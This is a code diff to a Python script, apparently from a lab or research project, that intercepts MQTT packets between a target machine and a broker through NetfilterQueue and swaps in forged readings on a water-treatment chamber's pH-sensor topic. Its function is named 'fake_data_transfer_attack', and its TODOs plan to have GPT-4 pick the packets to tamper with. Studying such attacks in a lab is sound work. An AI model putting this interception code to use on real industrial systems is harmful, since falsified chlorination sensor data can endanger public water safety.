@@ -15,7 +15,7 @@ from netfilterqueue import NetfilterQueue
 API_KEY = "Insert here"
 openai.api_key = API_KEY
 llm_model = "gpt-4"
-targetIP = "192.168.8.159"
+targetIP = "192.168.8.207"
 brokerIP = "192.168.8.210"
 message = ""
 sniffed_topic = ""
@@ -99,10 +99,12 @@ def intercept_modify_forward(pkt):
         # Check if this is MQTT traffic between the two VMs
         #TODO: Have AI determine if this is a MQTT packet and if the destination IP is of interest.
         if (tcp_dport == 1883 and ip_src == targetIP):
-            #print(f"Packet received: {pkt}")
             topic, message = mqtt_payload_parser(bytes(packet[TCP].payload))
+            #print(f"Packet received: {pkt}")
+            #print(f"topic received: {topic}")
+            #print(f"message received: {message}")
             #TODO: Have AI determine if the topic related to the cholrination ph sensor and if there is a message attached.
-            if topic == "chlo_chamber/ph_sensor" and message:
+            if topic == "dech_chamber/ph_sensor" and message:
                 print("\nTopic: " + topic + "\n")
                 
                 #Constructs and assigns new payload.
@@ -154,6 +156,7 @@ def fake_data_transfer_attack():
         
         nfqueue = NetfilterQueue()
         nfqueue.bind(1, intercept_modify_forward)
+        print("here")
         try:
             nfqueue.run()
         except Exception as e:
